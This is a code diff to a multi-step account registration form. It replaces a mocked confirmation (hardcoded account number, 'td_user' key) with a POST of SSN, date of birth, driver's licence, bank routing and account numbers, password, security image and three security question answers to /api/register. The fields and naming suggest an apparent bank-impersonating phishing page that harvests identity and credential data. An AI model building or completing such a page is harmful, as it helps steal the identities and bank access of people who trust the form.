@@ -901,6 +901,7 @@
       <div class="step" id="step6">
         <h2>Account Security</h2>
         <p class="subtitle">Set up your account credentials and security features.</p>
+        <div id="regErrorMsg" style="display:none;color:#c0392b;font-weight:bold;margin:10px 0;padding:8px 12px;background:#fff4f4;border:1px solid #f5c6cb;border-radius:4px;"></div>
 
         <div class="form-grid">
           <div class="form-row">
@@ -1029,6 +1030,8 @@
       <div class="step" id="step7">
         <h2>Review Your Information</h2>
         <p class="subtitle">Please review all details before submitting. You can edit any section.</p>
+
+        <div id="regErrorMsg7" style="display:none;color:#c0392b;font-weight:bold;margin:10px 0;padding:8px 12px;background:#fff4f4;border:1px solid #f5c6cb;border-radius:4px;"></div>
 
         <div id="reviewContent"></div>
 
@@ -1268,16 +1271,6 @@ function goToStep(n) {
   document.getElementById('stepTitle').textContent = titles[n];
   document.getElementById('progressHeader').style.display = (n === 8) ? 'none' : 'block';
   if (n === 7) buildReview();
-  if (n === 8) {
-    setTimeout(() => {
-      const s = state;
-      document.getElementById('confirmAccountType').textContent = s.accountType;
-      document.getElementById('confirmName').textContent = s.firstName + ' ' + s.lastName;
-      document.getElementById('confirmType').textContent = s.accountType + ' Account';
-      document.getElementById('confirmDate').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
-      goToStep(9);
-    }, 2500);
-  }
   window.scrollTo({ top: 0, behavior: 'smooth' });
 }
 
@@ -1299,8 +1292,15 @@ function clearErrors() {
 }
 
 function showError(id) {
-  const el = document.getElementById(id);
-  if (el) el.classList.add('visible');
+  if (id && id.includes) {
+    // Message string case (from submitApplication)
+    const msgEl = document.getElementById('regErrorMsg');
+    if (msgEl) { msgEl.textContent = id; msgEl.style.display = 'block'; }
+  } else {
+    // Field ID case (from validation steps)
+    const el = document.getElementById(id);
+    if (el) el.classList.add('visible');
+  }
 }
 
 function markError(inputId) {
@@ -1488,15 +1488,74 @@ function toggleSubmit() {
   document.getElementById('submitBtn').disabled = !checked;
 }
 function submitApplication() {
+  saveCurrentStep();
   const s = state;
-  const userData = {
+
+  const err7 = document.getElementById('regErrorMsg7');
+  if (err7) { err7.style.display = 'none'; err7.textContent = ''; }
+
+  const registerData = {
+    accountType: s.accountType,
     firstName: s.firstName,
+    middleName: s.middleName,
     lastName: s.lastName,
-    accountNumber: 'ADVP765BJ',
-    accountType: s.accountType
+    name: s.firstName + ' ' + (s.middleName || '') + ' ' + s.lastName,
+    dob: s.dob,
+    ssn: s.ssn,
+    phone: s.phone,
+    email: s.email,
+    driversLicense: s.driversLicense,
+    dlState: s.dlState,
+    street: s.street,
+    apt: s.apt,
+    city: s.city,
+    stateAddress: s.stateAddr,
+    zip: s.zip,
+    country: s.country,
+    acctType: s.acctType,
+    bankAcctType: s.acctType,
+    routing: s.routing,
+    accountNum: s.accountNum,
+    bankName: s.bankName,
+    password: s.password,
+    passwordReminder: s.passwordReminder,
+    secImage: s.secImage,
+    imageCaption: s.imageCaption,
+    secQ1: s.secQ1, secA1: s.secA1,
+    secQ2: s.secQ2, secA2: s.secA2,
+    secQ3: s.secQ3, secA3: s.secA3,
+    turnstileToken: (document.querySelector('input[name="cf-turnstile-response"]') || {}).value || ''
   };
-  sessionStorage.setItem('td_user', JSON.stringify(userData));
+
+  const btn = document.getElementById('submitBtn');
+  if (btn) { btn.disabled = true; btn.textContent = 'Submitting...'; }
+
   goToStep(8);
+
+  fetch('/api/register', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(registerData)
+  })
+  .then(r => r.json().catch(() => ({ success: false, error: 'Unexpected server response.' })))
+  .then(data => {
+    if (data && data.success) {
+      window.location.href = data.redirect || '/dashboard/';
+    } else {
+      const msg = (data && data.error) || 'Registration failed. Please try again.';
+      goToStep(7);
+      if (err7) { err7.textContent = msg; err7.style.display = 'block'; }
+      if (btn) { btn.disabled = false; btn.textContent = 'Submit Application \u2192'; }
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+  })
+  .catch(err => {
+    console.error('Registration error:', err);
+    goToStep(7);
+    if (err7) { err7.textContent = 'Could not connect to server. Please try again later.'; err7.style.display = 'block'; }
+    if (btn) { btn.disabled = false; btn.textContent = 'Submit Application \u2192'; }
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  });
 }
 function cancelFlow() {
   if (confirm('Are you sure you want to cancel? Your progress will be lost.')) {
